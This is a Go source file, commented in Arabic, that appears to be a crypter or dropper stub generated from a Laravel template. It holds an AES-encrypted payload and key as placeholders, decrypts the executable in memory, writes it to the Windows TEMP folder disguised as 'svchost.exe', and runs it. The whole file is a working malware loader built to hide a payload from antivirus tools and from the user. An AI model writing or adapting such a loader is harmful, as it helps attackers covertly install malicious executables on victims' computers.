package main

import (
	"crypto/aes"
	"crypto/cipher"
	"os"
	"os/exec"
)

// المتغيرات المشفرة (يتم استبدالها من Laravel)
var EncryptedPayload = __ENCRYPTED_PAYLOAD__
var AesKey = __AES_KEY__

func main() {
	// 1. فك تشفير البايلود في الذاكرة
	block, err := aes.NewCipher(AesKey)
	if err != nil {
		return
	}

	// استخراج الـ IV (أول 16 بايت)
	iv := EncryptedPayload[:aes.BlockSize]
	ciphertext := EncryptedPayload[aes.BlockSize:]

	// فك التشفير
	mode := cipher.NewCBCDecrypter(block, iv)
	decryptedExe := make([]byte, len(ciphertext))
	mode.CryptBlocks(decryptedExe, ciphertext)

	// إزالة الـ Padding
	paddingLen := int(decryptedExe[len(decryptedExe)-1])
	if paddingLen > 0 && paddingLen <= aes.BlockSize {
		decryptedExe = decryptedExe[:len(decryptedExe)-paddingLen]
	}

	// 2. كتابة الملف المفكوك في مجلد مؤقت وتنفيذه
	tempPath := os.Getenv("TEMP") + "\\svchost.exe"
	err = os.WriteFile(tempPath, decryptedExe, 0755)
	if err != nil {
		return
	}

	cmd := exec.Command(tempPath)
	cmd.Run()
}